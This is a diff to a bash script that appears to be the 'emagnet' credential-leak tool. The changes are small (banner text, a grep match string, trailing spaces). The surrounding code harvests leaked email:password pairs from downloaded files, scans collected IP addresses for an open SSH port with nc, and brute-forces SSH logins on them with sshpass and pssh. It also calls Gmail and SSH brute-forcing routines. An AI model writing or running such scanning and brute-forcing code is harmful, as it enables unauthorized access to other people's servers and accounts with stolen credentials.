@@ -656,10 +656,10 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
         else
         echo -e "                       - IPv4 Addresses Found \r             [\e[1;32m$(cat $SSHPORTSCAN|wc -l)\e[0m] "
         sleep 2
-        xargs -i -P $THREADS timeout 0.5 nc -zvn {} 22 < $SSHPORTSCAN 2>&1 |grep 'succeeded!'|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $SSHTARGETS
+        xargs -i -P $THREADS timeout 0.5 nc -zvn {} 22 < $SSHPORTSCAN 2>&1 |grep 'open'|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $SSHTARGETS
         echo -e "                       - Has Port $SSHPORT Open\r             [\e[1;32m$(cat $SSHTARGETS|wc -l)\e[0m] "
         printf "\n%64s\n" | tr ' ' '='
-        printf "\n%15s";printf "BRUTE FORCING \e[1;34mSSH\e[0m TARGETS\e[0m\n\n"
+        printf "\n%15s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m TARGETS\e[0m\n\n"
         sleep 2
         sshpass -p "$SSHPASS" pssh  -O "StrictHostKeyChecking=no" -I -A -h $SSHTARGETS -i "uptime" < $SSHTARGETS |grep --color -i 'success\|failure' 
    fi
@@ -909,9 +909,9 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
                "${pt}" - Passwords Found\n
                "${et}" - Email Addresses Found"
              fi
-               echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m]"
-               echo -e "                       - Passwords Found \r             [\e[1;32m$pt\e[0m]"
-               echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m]\n"
+               echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m] "
+               echo -e "                       - Passwords Found \r             [\e[1;32m$pt\e[0m] "
+               echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m] "
                sleep 2
 
                if [[ "$GBRUTEFORCE" = "true" ]]; then
@@ -919,8 +919,6 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
                   printf "%17s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
                   emagnet_gmail_bruter
                 elif [[ "$SBRUTEFORCE" = "true" ]]; then
-                  printf "%64s \n\n" | tr ' ' '='
-                  printf "%15s";printf "BRUTE FORCING -- \e[0;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
                   emagnet_sshbruter
                 elif [[ "$PBRUTEFORCE" = "true" ]]; then
                   printf "%64s \n\n" | tr ' ' '='
